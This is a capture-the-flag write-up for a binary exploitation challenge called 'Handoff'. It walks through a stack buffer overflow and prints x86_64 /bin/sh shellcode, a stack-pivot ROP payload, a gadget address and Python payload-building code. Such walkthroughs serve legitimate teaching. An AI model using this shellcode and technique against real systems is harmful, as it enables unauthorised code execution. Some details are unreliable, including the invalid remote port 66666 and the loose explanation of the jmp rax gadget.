# Handoff Challenge - Binary Exploitation Solution

## Challenge Overview
The "Handoff" challenge is a binary exploitation task that requires leveraging a buffer overflow vulnerability to gain a shell on the target system.

## Vulnerability Analysis

### Source Code Review
Analyzing the `handoff.c` source code reveals two key vulnerabilities:

1. **Buffer Overflow in Feedback Function**:
   ```c
   char feedback[8];
   // ...
   fgets(feedback, NAME_LEN, stdin); // NAME_LEN is 32
   ```
   The feedback buffer is only 8 bytes, but the program reads up to 32 bytes into it, allowing us to overflow the buffer and control the return address when the `vuln()` function exits.

2. **Controllable Memory Region**:
   ```c
   fgets(entries[choice].msg, MSG_LEN, stdin); // MSG_LEN is 64
   ```
   The program allows us to write arbitrary data (up to 64 bytes) to entry messages, giving us a location to store our shellcode.

3. **Memory Layout Information**:
   ```c
   printf("entries[0].msg address: %p\n", (void*)&entries[0].msg);
   ```
   The program even conveniently prints the address of the message buffer where we'll store our shellcode.

## Exploitation Strategy

Our exploit has three main components:

1. **Store shellcode** in an entry message buffer
2. **Overflow the stack** through the feedback buffer to control the return address
3. **Redirect execution** to our shellcode using a ROP chain with stack pivot

## Exploit Code Breakdown

### 1. Key Constants and Configuration

```python
NOP_SLED_SIZE = 36           # Size of NOP sled to improve shellcode reliability
BUFFER_OFFSET = 726          # Distance from rsp to shellcode buffer
ROP_PADDING_SIZE = 20        # Padding for ROP chain alignment
JMP_RAX_ADDR = 0x40116c      # Address of a useful gadget: jmp rax
```

The `BUFFER_OFFSET` is critical - it's the distance from the stack pointer (after the function returns) to our shellcode location.

### 2. Shellcode Generation

```python
def generate_shellcode():
    # Standard x86_64 shellcode that spawns /bin/sh
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    
    # NOP sled makes the shellcode more reliable by giving us a larger target
    padded_shellcode = b"\x90" * NOP_SLED_SIZE + shellcode
    
    return padded_shellcode
```

The shellcode executes `/bin/sh`, and the NOP sled increases our chances of successfully hitting the shellcode.

### 3. ROP Chain Construction

```python
def create_rop_chain(binary):
    # ...
    
    # Create stack pivot to reach our shellcode
    stack_pivot = asm(f"""
        nop
        nop
        sub rsp, {BUFFER_OFFSET}  # Move stack pointer to our shellcode buffer
        jmp rsp                   # Jump to execute our shellcode
    """)
    
    # Build the final ROP payload
    rop_payload = stack_pivot.ljust(ROP_PADDING_SIZE, b"\x90") + p64(jmp_rax_addr)
    
    return rop_payload
```

**Note on using `jmp rax`:** In a buffer overflow scenario, the register `rax` can be made to hold the start address of the overflowed bufferâ€” in our case, the feedback buffer. Although this behavior might be influenced by the C runtime settings, we can leverage it so that the feedback buffer itself stores the next ROP chain. This ROP chain decrements `rsp` by 726 bytes (positioning it at the shellcode buffer) and then jumps to `rsp` via the `jmp rax` gadget. This technique allows us to effectively redirect execution flow to our payload.

### 4. Full Payload Assembly

```python
def build_full_payload(shellcode, rop_payload):
    return (
        b"1\n"              # Option 1: Add recipient
        b"A\n"              # Recipient name (arbitrary)
        b"2\n"              # Option 2: Send message
        b"0\n"              # Select recipient index 0
        + shellcode + b"\n"  # Send shellcode as message
        b"3\n"              # Option 3: Exit
        + rop_payload + b"\n" # Feedback with ROP chain
    )
```

Our payload performs these actions:
1. Add a recipient (option 1) with name "A"
2. Send a message to recipient 0 (option 2), which contains our shellcode
3. Choose to exit (option 3), providing our ROP chain as feedback

## Execution Flow

When the program runs with our exploit:

1. **Setup**: A recipient is added with name "A"
2. **Shellcode Placement**: Our shellcode is stored in the message buffer of recipient 0
3. **Buffer Overflow**: We trigger the feedback function and overflow the buffer with our ROP chain
4. **Return Hijack**: When `vuln()` returns, it jumps to our ROP gadget at 0x40116c (`jmp rax`)
5. **Stack Pivot**: Our ROP chain executes, moving RSP to point to our shellcode
6. **Shellcode Execution**: Control flows into our NOP sled, then into the shellcode
7. **Shell Access**: The shellcode spawns a shell, giving us command execution

## Memory Layout Analysis

Looking at the binary structure, here's how the stack would look during the exploit:
```
High memory addresses
+----------------+
| Return address | <- Overwritten with address of jmp rax gadget
+----------------+
| Saved rbp      | <- Also overwritten by our payload
+----------------+
| ...            |
+----------------+
| feedback[7]    |
| ...            |
| feedback[0]    | <- Original 8-byte buffer
+----------------+
| ...            |
+----------------+
| entries[].msg  | <- Where our shellcode is stored (726 bytes from RSP)
+----------------+
Low memory addresses
```

## Finding the JMP RAX Gadget

The address 0x40116c was found by analyzing the binary using ROPgadget:

```
$ ROPgadget --binary ./handoff | grep "jmp rax"
0x000000000040116c : jmp rax
```

This gadget is crucial for our exploit as it allows us to start executing our stack pivot code.

## Running the Exploit

To run the exploit against a local target:

```
python3 exploit.py
```

To run against the remote challenge:

```
python3 exploit.py -r -p 66666
```

When the script executes successfully, you will get an interactive shell where you can run commands like `cat flag.txt` to retrieve the flag.

## Conclusion

This exploit demonstrates a classic stack buffer overflow that:
1. Places shellcode in a controlled memory region
2. Uses a stack pivot technique to redirect execution flow
3. Leverages ROP to execute arbitrary code despite modern protections

The vulnerability could have been prevented by properly restricting the input size to match the buffer size or by enabling additional protections like stack canaries.
